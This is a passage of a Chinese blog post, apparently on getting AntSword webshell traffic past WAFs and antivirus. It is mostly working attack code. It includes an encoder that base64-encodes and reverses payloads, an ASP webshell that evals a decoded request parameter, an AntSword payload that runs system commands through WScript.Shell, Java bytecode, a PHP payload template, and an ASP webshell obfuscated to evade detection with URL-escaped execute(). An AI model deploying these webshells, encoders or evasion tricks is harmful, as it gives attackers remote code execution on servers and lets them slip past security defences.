asp::base64,re编码器</span></span><br><span class="line"><span class="comment"> * Create at: 2024/03/04 21:37:02</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* @param  &#123;String&#125; pwd   连接密码</span></span><br><span class="line"><span class="comment">* @param  &#123;Array&#125;  data  编码器处理前的 payload 数组</span></span><br><span class="line"><span class="comment">* @return &#123;Array&#125;  data  编码器处理后的 payload 数组</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function">(<span class="params">pwd, data, ext=&#123;&#125;</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">  data[pwd] = Buffer.from(data[<span class="string">&#x27;_&#x27;</span>]).toString(<span class="string">&#x27;base64&#x27;</span>).split(<span class="string">&#x27;&#x27;</span>).reverse().join(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">  <span class="comment">// shell 在接收到 payload 后，base64,然后逆序。</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// ##########    请在上方编写你自己的代码   ###################</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 删除 _ 原有的payload</span></span><br><span class="line">  <span class="keyword">delete</span> data[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line">  <span class="comment">// 返回编码器处理后的 payload 数组</span></span><br><span class="line">  <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">OPTION EXPLICIT</span><br><span class="line">const BASE_64_MAP_INIT = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span><br><span class="line">dim newline</span><br><span class="line">dim Base64EncMap(63)</span><br><span class="line">dim Base64DecMap(127)</span><br><span class="line">&#x27;初始化函数</span><br><span class="line">PUBLIC SUB initCodecs()</span><br><span class="line">    &#x27; 初始化变量</span><br><span class="line">    newline = &quot;&lt;P&gt;&quot; &amp; chr(13) &amp; chr(10)</span><br><span class="line">    dim max, idx</span><br><span class="line">    max = len(BASE_64_MAP_INIT)</span><br><span class="line">    for idx = 0 to max - 1</span><br><span class="line">        Base64EncMap(idx) = mid(BASE_64_MAP_INIT, idx + 1, 1)</span><br><span class="line">    next</span><br><span class="line">    for idx = 0 to max - 1</span><br><span class="line">        Base64DecMap(ASC(Base64EncMap(idx))) = idx</span><br><span class="line">    next</span><br><span class="line">END SUB</span><br><span class="line">&#x27;Base64解密函数</span><br><span class="line">PUBLIC FUNCTION base64Decode(scrambled)</span><br><span class="line">    if len(scrambled) = 0 then</span><br><span class="line">        base64Decode = &quot;&quot;</span><br><span class="line">        exit function</span><br><span class="line">    end if</span><br><span class="line">    dim realLen</span><br><span class="line">    realLen = len(scrambled)</span><br><span class="line">    do while mid(scrambled, realLen, 1) = &quot;=&quot;</span><br><span class="line">        realLen = realLen - 1</span><br><span class="line">    loop</span><br><span class="line">    dim ret, ndx, by4, first, second, third, fourth</span><br><span class="line">    ret = &quot;&quot;</span><br><span class="line">    by4 = (realLen \ 4) * 4</span><br><span class="line">    ndx = 1</span><br><span class="line">    do while ndx &lt;= by4</span><br><span class="line">        first = Base64DecMap(asc(mid(scrambled, ndx+0, 1)))</span><br><span class="line">        second = Base64DecMap(asc(mid(scrambled, ndx+1, 1)))</span><br><span class="line">        third = Base64DecMap(asc(mid(scrambled, ndx+2, 1)))</span><br><span class="line">        fourth = Base64DecMap(asc(mid(scrambled, ndx+3, 1)))</span><br><span class="line">        ret = ret &amp; chr( ((first * 4) AND 255) + ((second \ 16) AND 3))</span><br><span class="line">        ret = ret &amp; chr( ((second * 16) AND 255) + ((third \ 4) AND 15))</span><br><span class="line">        ret = ret &amp; chr( ((third * 64) AND 255) + (fourth AND 63))</span><br><span class="line">        ndx = ndx + 4</span><br><span class="line">    loop</span><br><span class="line">    if ndx &lt; realLen then</span><br><span class="line">        first = Base64DecMap(asc(mid(scrambled, ndx+0, 1)))</span><br><span class="line">        second = Base64DecMap(asc(mid(scrambled, ndx+1, 1)))</span><br><span class="line">        ret = ret &amp; chr( ((first * 4) AND 255) + ((second \ 16) AND 3))</span><br><span class="line">        if realLen MOD 4 = 3 then</span><br><span class="line">            third = Base64DecMap(asc(mid(scrambled,ndx+2,1)))</span><br><span class="line">            ret = ret &amp; chr( ((second * 16) AND 255) + ((third \ 4) AND 15))</span><br><span class="line">        end if</span><br><span class="line">    end if</span><br><span class="line">    base64Decode = ret</span><br><span class="line">END FUNCTION</span><br><span class="line">&#x27; 初始化</span><br><span class="line">call initCodecs</span><br><span class="line">Dim expression</span><br><span class="line">expression = Request(&quot;a&quot;)</span><br><span class="line">&#x27; Response.Write expression</span><br><span class="line">Dim result</span><br><span class="line">result = eval(base64Decode(StrReverse(expression)))</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><img src="/images/antsword-bypasswaf/image-20240402145431019.png" alt="image-20240402145431019"></p><p><img src="/images/antsword-bypasswaf/image-20240402145440952.png" alt="image-20240402145440952"></p><p>方法不唯一，你再套一层base64也可以，或者其他的都行</p><h5 id="asp解码器"><a href="#asp解码器" class="headerlink" title="asp解码器"></a>asp解码器</h5><p>先放着，未解决</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">eval(&quot;Ex&quot;&amp;cHr(101)&amp;&quot;cute(&quot;&quot;Server.ScriptTimeout=3600:On Error Resume Next:Function bd(byVal s):For i=1 To Len(s) Step 2:c=Mid(s,i,2):If IsNumeric(Mid(s,i,1)) Then:Execute(&quot;&quot;&quot;&quot;bd=bd&amp;chr(&amp;H&quot;&quot;&quot;&quot;&amp;c&amp;&quot;&quot;&quot;&quot;)&quot;&quot;&quot;&quot;):Else:Execute(&quot;&quot;&quot;&quot;bd=bd&amp;chr(&amp;H&quot;&quot;&quot;&quot;&amp;c&amp;Mid(s,i+2,2)&amp;&quot;&quot;&quot;&quot;)&quot;&quot;&quot;&quot;):i=i+2:End If&quot;&quot;&amp;chr(10)&amp;&quot;&quot;Next:End Function:Response.Write(&quot;&quot;&quot;&quot;fa68f&quot;&quot;&quot;&quot;&amp;&quot;&quot;&quot;&quot;8ae679&quot;&quot;&quot;&quot;):Ex&quot;&amp;cHr(101)&amp;&quot;cute(&quot;&quot;&quot;&quot;On Error Resume Next:&quot;&quot;&quot;&quot;&amp;bd(&quot;&quot;&quot;&quot;53657420507574456E763D4372656174654F626A6563742822575363726970742E5368656C6C22292E456E7669726F6E6D656E74282250726F6365737322293A656E767374723D53706C69742822222662642852657175657374282273393564663431313539353839662229292622222C20227C7C7C61736C696E657C7C7C22293A466F72204561636820656E766C696E6520696E20656E767374723A4966204C656E28656E766C696E65293E30205468656E3A73733D53706C697428656E766C696E652C20227C7C7C61736B65797C7C7C22293A507574456E76287373283029293D73732831293A456E642049663A4E6578743A53657420583D4372656174654F626A6563742822777363726970742E7368656C6C22292E65786563282222222226626428526571756573742822786462656436376438316664306322292926222222202F63202222222662642852657175657374282278326335613238636464366561382229292622222222293A496620457272205468656E3A533D225B4572725D2022264572722E4465736372697074696F6E3A4572722E436C6561723A456C73653A4F3D582E5374644F75742E52656164416C6C28293A453D582E5374644572722E52656164416C6C28293A533D4F26453A456E642049663A526573706F6E73652E7772697465285329&quot;&quot;&quot;&quot;)):Response.Write(&quot;&quot;&quot;&quot;c9dd&quot;&quot;&quot;&quot;&amp;&quot;&quot;&quot;&quot;b1fc&quot;&quot;&quot;&quot;):Response.End&quot;&quot;)&quot;)</span><br><span class="line"></span><br><span class="line">Set PutEnv=CreateObject(&quot;WScript.Shell&quot;).Environment(&quot;Process&quot;):envstr=Split(&quot;&quot;&amp;bd(Request(&quot;s95df41159589f&quot;))&amp;&quot;&quot;, &quot;|||asline|||&quot;):For Each envline in envstr:If Len(envline)&gt;0 Then:ss=Split(envline, &quot;|||askey|||&quot;):PutEnv(ss(0))=ss(1):End If:Next:Set X=CreateObject(&quot;wscript.shell&quot;).exec(&quot;&quot;&quot;&quot;&amp;bd(Request(&quot;xdbed67d81fd0c&quot;))&amp;&quot;&quot;&quot; /c &quot;&quot;&quot;&amp;bd(Request(&quot;x2c5a28cdd6ea8&quot;))&amp;&quot;&quot;&quot;&quot;):If Err Then:S=&quot;[Err] &quot;&amp;Err.Description:Err.Clear:Else:O=X.StdOut.ReadAll():E=X.StdErr.ReadAll():S=O&amp;E:End If:Response.write(S)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cd /d &quot;&quot;&amp;systeminfo&amp;echo e504dc95&amp;cd&amp;echo dc8d8a</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">package src;</span><br><span class="line"></span><br><span class="line">public class AsoutputReverse &#123;</span><br><span class="line">    String res;</span><br><span class="line"></span><br><span class="line">    public AsoutputReverse(String var1) &#123;</span><br><span class="line">        this.res = (new StringBuffer(var1)).reverse().toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String toString() &#123;</span><br><span class="line">        return &quot;&#123;\&quot;message\&quot;:\&quot;&quot; + this.res + &quot;\&quot;&#125;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">yv66vgAAADEAHgoACAATBwAUCgACABUKAAIAFgoAAgAXCQAHABgHABkHABoBAANyZXMBABJMamF2YS9sYW5nL1N0cmluZzsBAAY8aW5pdD4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAClNvdXJjZUZpbGUBABRBc291dHB1dFJldmVyc2UuamF2YQwACwAbAQAWamF2YS9sYW5nL1N0cmluZ0J1ZmZlcgwACwAMDAAcAB0MAA8AEAwACQAKAQATc3JjL0Fzb3V0cHV0UmV2ZXJzZQEAEGphdmEvbGFuZy9PYmplY3QBAAMoKVYBAAdyZXZlcnNlAQAaKClMamF2YS9sYW5nL1N0cmluZ0J1ZmZlcjsAIQAHAAgAAAABAAAACQAKAAAAAgABAAsADAABAA0AAAA3AAQAAgAAABcqtwABKrsAAlkrtwADtgAEtgAFtQAGsQAAAAEADgAAAA4AAwAAAAQABAAFABYABgABAA8AEAABAA0AAAAdAAEAAQAAAAUqtAAGsAAAAAEADgAAAAYAAQAAAAkAAQARAAAAAgAS</span><br><span class="line"></span><br><span class="line">yv66vgAAADEAHgoACAATBwAUCgACABUKAAIAFgoAAgAXCQAHABgHABkHABoBAANyZXMBABJMamF2YS9sYW5nL1N0cmluZzsBAAY8aW5pdD4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAClNvdXJjZUZpbGUBABRBc291dHB1dFJldmVyc2UuamF2YQwACwAbAQAWamF2YS9sYW5nL1N0cmluZ0J1ZmZlcgwACwAMDAAcAB0MAA8AEAwACQAKAQATc3JjL0Fzb3V0cHV0UmV2ZXJzZQEAEGphdmEvbGFuZy9PYmplY3QBAAMoKVYBAAdyZXZlcnNlAQAaKClMamF2YS9sYW5nL1N0cmluZ0J1ZmZlcjsAIQAHAAgAAAABAAAACQAKAAAAAgABAAsADAABAA0AAAA3AAQAAgAAABcqtwABKrsAAlkrtwADtgAEtgAFtQAGsQAAAAEADgAAAA4AAwAAAAQABAAFABYABgABAA8AEAABAA0AAAAdAAEAAQAAAAUqtAAGsAAAAAEADgAAAAYAAQAAAAkAAQARAAAAAgAS</span><br><span class="line"></span><br><span class="line">yv66vgAAADsAHgoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClWBwAIAQAWamF2YS9sYW5nL1N0cmluZ0J1ZmZlcgoABwAKDAAFAAsBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYKAAcADQwADgAPAQAHcmV2ZXJzZQEAGigpTGphdmEvbGFuZy9TdHJpbmdCdWZmZXI7CgAHABEMABIAEwEACHRvU3RyaW5nAQAUKClMamF2YS9sYW5nL1N0cmluZzsJABUAFgcAFwwAGAAZAQATc3JjL0Fzb3V0cHV0UmV2ZXJzZQEAA3JlcwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApTb3VyY2VGaWxlAQAUQXNvdXRwdXRSZXZlcnNlLmphdmEAIQAVAAIAAAABAAAAGAAZAAAAAgABAAUACwABABoAAAA3AAQAAgAAABcqtwABKrsAB1krtwAJtgAMtgAQtQAUsQAAAAEAGwAAAA4AAwAAAAUABAAGABYABwABABIAEwABABoAAAAdAAEAAQAAAAUqtAAUsAAAAAEAGwAAAAYAAQAAAAoAAQAcAAAAAgAd</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data[&#x27;_&#x27;] = `@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);$&#123;bypassOpenBaseDirCode&#125;;function asenc($out)&#123;</span><br><span class="line">  return @base64_encode($out);;function asoutput()&#123;$output=ob_get_contents();ob_end_clean();echo &quot;&quot;.&quot;&quot;;echo @asenc($output);echo &quot;&quot;.&quot;&quot;;&#125;ob_start();try&#123;$&#123;tmpCode&#125;;&#125;catch(Exception $e)&#123;echo &quot;ERROR://&quot;.$e-&gt;getMessage();&#125;;asoutput();die();`;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>记录一下asp的免杀</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">execute(unescape(&quot;%4f%50%54%49%4f%4e%20%45%58%50%4c%49%43%49%54%0a%63%6f%6e%73%74%20%42%41%53%45%5f%36%34%5f%4d%41%50%5f%49%4e%49%54%20%3d%20%22%41%42%43%44%45%46%47%48%49%4a%4b%4c%4d%4e%4f%50%51%52%53%54%55%56%57%58%59%5a%61%62%63%64%65%66%67%68%69%6a%6b%6c%6d%6e%6f%70%71%72%73%74%75%76%77%78%79%7a%30%31%32%33%34%35%36%37%38%39%2b%2f%22%0a%64%69%6d%20%6e%65%77%6c%69%6e%65%0a%64%69%6d%20%42%61%73%65%36%34%45%6e%63%4d%61%70%28%36%33%29%0a%64%69%6d%20%42%61%73%65%36%34%44%65%63%4d%61%70%28%31%32%37%29%0a%27%1d%cb%16%fd%70%0a%50%55%42%4c%49%43%20%53%55%42%20%69%6e%69%74%43%6f%64%65%63%73%28%29%0a%20%20%20%20%27%20%1d%cb%16%d8%cf%0a%20%20%20%20%6e%65%77%6c%69%6e%65%20%3d%20%22%3c%50%3e%22%20%26%20%63%68%72%28%31%33%29%20%26%20%63%68%72%28%31%30%29%0a%20%20%20%20%64%69%6d%20%6d%61%78%2c%20%69%64%78%0a%20%20%20%20%6d%61%78%20%3d%20%6c%65%6e%28%42%41%53%45%5f%36%34%5f%4d%41%50%5f%49%4e%49%54%29%0a%20%20%20%20%66%6f%72%20%69%64%78%20%3d%20%30%20%74%6f%20%6d%61%78%20%2d%20%31%0a%20%20%20%20%20%20%20%20%42%61%73%65%36%34%45%6e%63%4d%61%70%28%69%64%78%29%20%3d%20%6d%69%64%28%42%41%53%45%5f%36%34%5f%4d%41%50%5f%49%4e%49%54%2c%20%69%64%78%20%2b%20%31%2c%20%31%29%0a%20%20%20%20%6e%65%78%74%0a%20%20%20%20%66%6f%72%20%69%64%78%20%3d%20%30%20%74%6f%20%6d%61%78%20%2d%20%31%0a%20%20%20%20%20%20%20%20%42%61%73%65%36%34%44%65%63%4d%61%70%28%41%53%43%28%42%61%73%65%36%34%45%6e%63%4d%61%70%28%69%64%78%29%29%29%20%3d%20%69%64%78%0a%20%20%20%20%6e%65%78%74%0a%45%4e%44%20%53%55%42%0a%27%42%61%73%65%36%34%e3%c6%fd%70%0a%50%55%42%4c%49%43%20%46%55%4e%43%54%49%4f%4e%20%62%61%73%65%36%34%44%65%63%6f%64%65%28%73%63%72%61%6d%62%6c%65%64%29%0a%20%20%20%20%69%66%20%6c%65%6e%28%73%63%72%61%6d%62%6c%65%64%29%20%3d%20%30%20%74%68%65%6e%0a%20%20%20%20%20%20%20%20%62%61%73%65%36%34%44%65%63%6f%64%65%20%3d%20%22%22%0a%20%20%20%20%20%20%20%20%65%78%69%74%20%66%75%6e%63%74%69%6f%6e%0a%20%20%20%20%65%6e%64%20%69%66%0a%20%20%20%20%64%69%6d%20%72%65%61%6c%4c%65%6e%0a%20%20%20%20%72%65%61%6c%4c%65%6e%20%3d%20%6c%65%6e%28%73%63%72%61%6d%62%6c%65%64%29%0a%20%20%20%20%64%6f%20%77%68%69%6c%65%20%6d%69%64%28%73%63%72%61%6d%62%6c%65%64%2c%20%72%65%61%6c%4c%65%6e%2c%20%31%29%20%3d%20%22%3d%22%0a%20%20%20%20%20%20%20%20%72%65%61%6c%4c%65%6e%20%3d%20%72%65%61%6c%4c%65%6e%20%2d%20%31%0a%20%20%20%20%6c%6f%6f%70%0a%20%20%20%20%64%69%6d%20%72%65%74%2c%20%6e%64%78%2c%20%62%79%34%2c%20%66%69%72%73%74%2c%20%73%65%63%6f%6e%64%2c%20%74%68%69%72%64%2c%20%66%6f%75%72%74%68%0a%20%20%20%20%72%65%74%20%3d%20%22%22%0a%20%20%20%20%62%79%34%20%3d%20%28%72%65%61%6c%4c%65%6e%20%5c%20%34%29%20%2a%20%34%0a%20%20%20%20%6e%64%78%20%3d%20%31%0a%20%20%20%20%64%6f%20%77%68%69%6c%65%20%6e%64%78%20%3c%3d%20%62%79%34%0a%20%20%20%20%20%20%20%20%66%69%72%73%74%20%3d%20%42%61%73%65%36%34%44%65%63%4d%61%70%28%61%73%63%28%6d%69%64%28%73%63%72%61%6d%62%6c%65%64%2c%20%6e%64%78%2b%30%2c%20%31%29%29%29%0a%20%20%20%20%20%20%20%20%73%65%63%6f%6e%64%20%3d%20%42%61%73%65%36%34%44%65%63%4d%61%70%28%61%73%63%28%6d%69%64%28%73%63%72%61%6d%62%6c%65%64%2c%20%6e%64%78%2b%31%2c%20%31%29%29%29%0a%20%20%20%20%20%20%20%20%74%68%69%72%64%20%3d%20%42%61%73%65%36%34%44%65%63%4d%61%70%28%61%73%63%28%6d%69%64%28%73%63%72%61%6d%62%6c%65%64%2c%20%6e%64%78%2b%32%2c%20%31%29%29%29%0a%20%20%20%20%20%20%20%20%66%6f%75%72%74%68%20%3d%20%42%61%73%65%36%34%44%65%63%4d%61%70%28%61%73%63%28%6d%69%64%28%73%63%72%61%6d%62%6c%65%64%2c%20%6e%64%78%2b%33%2c%20%31%29%29%29%0a%20%20%20%20%20%20%20%20%72%65%74%20%3d%20%72%65%74%20%26%20%63%68%72%28%20%28%28%66%69%72%73%74%20%2a%20%34%29%20%41%4e%44%20%32%35%35%29%20%2b%20%28%28%73%65%63%6f%6e%64%20%5c%20%31%36%29%20%41%4e%44%20%33%29%29%0a%20%20%20%20%20%20%20%20%72%65%74%20%3d%20%72%65%74%20%26%20%63%68%72%28%20%28%28%73%65%63%6f%6e%64%20%2a%20%31%36%29%20%41%4e%44%20%32%35%35%29%20%2b%20%28%28%74%68%69%72%64%20%5c%20%34%29%20%41%4e%44%20%31%35%29%29%0a%20%20%20%20%20%20%20%20%72%65%74%20%3d%20%72%65%74%20%26%20%63%68%72%28%20%28%28%74%68%69%72%64%20%2a%20%36%34%29%20%41%4e%44%20%32%35%35%29%20%2b%20%28%66%6f%75%72%74%68%20%41%4e%44%20%36%33%29%29%0a%20%20%20%20%20%20%20%20%6e%64%78%20%3d%20%6e%64%78%20%2b%20%34%0a%20%20%20%20%6c%6f%6f%70%0a%20%20%20%20%69%66%20%6e%64%78%20%3c%20%72%65%61%6c%4c%65%6e%20%74%68%65%6e%0a%20%20%20%20%20%20%20%20%66%69%72%73%74%20%3d%20%42%61%73%65%36%34%44%65%63%4d%61%70%28%61%73%63%28%6d%69%64%28%73%63%72%61%6d%62%6c%65%64%2c%20%6e%64%78%2b%30%2c%20%31%29%29%29%0a%20%20%20%20%20%20%20%20%73%65%63%6f%6e%64%20%3d%20%42%61%73%65%36%34%44%65%63%4d%61%70%28%61%73%63%28%6d%69%64%28%73%63%72%61%6d%62%6c%65%64%2c%20%6e%64%78%2b%31%2c%20%31%29%29%29%0a%20%20%20%20%20%20%20%20%72%65%74%20%3d%20%72%65%74%20%26%20%63%68%72%28%20%28%28%66%69%72%73%74%20%2a%20%34%29%20%41%4e%44%20%32%35%35%29%20%2b%20%28%28%73%65%63%6f%6e%64%20%5c%20%31%36%29%20%41%4e%44%20%33%29%29%0a%20%20%20%20%20%20%20%20%69%66%20%72%65%61%6c%4c%65%6e%20%4d%4f%44%20%34%20%3d%20%33%20%74%68%65%6e%0a%20%20%20%20%20%20%20%20%20%20%20%20%74%68%69%72%64%20%3d%20%42%61%73%65%36%34%44%65%63%4d%61%70%28%61%73%63%28%6d%69%64%28%73%63%72%61%6d%62%6c%65%64%2c%6e%64%78%2b%32%2c%31%29%29%29%0a%20%20%20%20%20%20%20%20%20%20%20%20%72%65%74%20%3d%20%72%65%74%20%26%20%63%68%72%28%20%28%28%73%65%63%6f%6e%64%20%2a%20%31%36%29%20%41%4e%44%20%32%35%35%29%20%2b%20%28%28%74%68%69%72%64%20%5c%20%34%29%20%41%4e%44%20%31%35%29%29%0a%20%20%20%20%20%20%20%20%65%6e%64%20%69%66%0a%20%20%20%20%65%6e%64%20%69%66%0a%20%20%20%20%62%61%73%65%36%34%44%65%63%6f%64%65%20%3d%20%72%65%74%0a%45%4e%44%20%46%55%4e%43%54%49%4f%4e%0a%27%20%1d%cb%16%0a%63%61%6c%6c%20%69%6e%69%74%43%6f%64%65%63%73%0a%44%69%6d%20%65%78%70%72%65%73%73%69%6f%6e%0a%65%78%70%72%65%73%73%69%6f%6e%20%3d%20%52%65%71%75%65%73%74%28%22%61%22%29%0a%27%20%52%65%73%70%6f%6e%73%65%2e%57%72%69%74%65%20%65%78%70%72%65%73%73%69%6f%6e%0a%44%69%6d%20%72%65%73%75%6c%74%0a%72%65%73%75%6c%74%20%3d%20%65%76%61%6c%28%62%61%73%65%36%34%44%65%63%6f%64%65%28%53%74%72%52%65%76%65%72%73%65%28%65%78%70%72%65%73%73%69%6f%6e%29%29%29&quot;))</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">OPTION EXPLICIT</span><br><span class="line">const BASE_64_MAP_INIT = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span><br><span class="line">dim newline</span><br><span class="line">dim Base64EncMap(63)</span><br><span class="line">dim Base64DecMap(127)</span><br><span class="line">&#x27;初始化函数</span><br><span class="line">PUBLIC SUB initCodecs()</span><br><span class="line">    &#x27; 初始化变量</span><br><span class="line">    newline = &quot;&lt;P&gt;&quot; &amp; chr(13) &amp; chr(10)</span><br><span class="line">    dim max, idx</span><br><span class="line">    max = len(BASE_64_MAP_INIT)</span><br><span class="line">    for idx = 0 to max - 1</span><br><span class="line">        Base64EncMap(idx) = mid(BASE_64_MAP_INIT, idx + 1, 1)</span><br><span class="line">    next</span><br><span class="line">    for idx = 0 to max - 1</span><br><span class="line">        Base64DecMap(ASC(Base64EncMap(idx))) = idx</span><br><span class="line">    next</span><br><span class="line">END SUB</span><br><span class="line">&#x27;Base64解密函数</span><br><span class="line">PUBLIC FUNCTION base64Decode(scrambled)</span><br><span class="line">    if len(scrambled) = 0 then</span><br><span class="line">        base64Decode = &quot;&quot;</span><br><span class="line">        exit function</span><br><span class="line">    end if</span><br><span class="line">    dim realLen</span><br><span class="line">    realLen = len(scrambled)</span><br><span class="line">    do while mid(scrambled, realLen, 1) = &quot;=&quot;</span><br><span class="line">        realLen = realLen - 1</span><br><span class="line">    loop</span><br><span class="line">    dim ret, ndx, by4, first, second, third, fourth</span><br><span class="line">    ret = &quot;&quot;</span><br><span class="line">    by4 = (realLen \ 4) * 4</span><br><span class="line">    ndx = 1</span><br><span class="line">    do while ndx &lt;= by4</span><br><span class="line">        first = Base64DecMap(asc(mid(scrambled, ndx+0, 1)))</span><br><span class="line">        second = Base64DecMap(asc(mid(scrambled, ndx+1, 1)))</span><br><span class="line">        third = Base64DecMap(asc(mid(scrambled, ndx+2, 1)))</span><br><span class="line">        fourth = Base64DecMap(asc(mid(scrambled, ndx+3, 1)))</span><br><span class="line">        ret = ret &amp; chr( ((first * 4) AND 255) + ((second \ 16) AND 3))</span><br><span class="line">        ret = ret &amp; chr( ((second * 16) AND 255) + ((third \ 4) AND 15))</span><br><span class="line">        ret = ret &amp; chr( ((third * 64) AND 255) + (fourth AND 63))</span><br><span class="line">        ndx = ndx + 4</span><br><span class="line">    loop</span><br><span class="line">    if ndx &lt; realLen then</span><br><span class="line">        first = Base64DecMap(asc(mid(scrambled, ndx+0, 1)))</span><br><span class="line">        second = Base64DecMap(asc(mid(scrambled, ndx+1, 1)))</span><br><span class="line">        ret = ret &amp; chr( ((first * 4) AND 255) + ((second \ 16) AND 3))</span><br><span class="line">        if realLen MOD 4 = 3 then</span><br><span class="line">            third = Base64DecMap(asc(mid(scrambled,ndx+2,1)))</span><br><span class="line">            ret = ret &amp; chr( ((second * 16) AND 255) + ((third \ 4) AND 15))</span><br><span class="line">        end if</span><br><span class="line">    end if</span><br><span class="line">    base64Decode = ret</span><br><span class="line">END FUNCTION</span><br><span class="line">&#x27; 初始化</span><br><span class="line">call initCodecs</span><br><span class="line">Dim expression</span><br><span class="line">expression = Request(&quot;a&quot;)</span><br><span class="line">&#x27; Response.Write expression</span><br><span class="line">Dim result</span><br><span class="line">result = 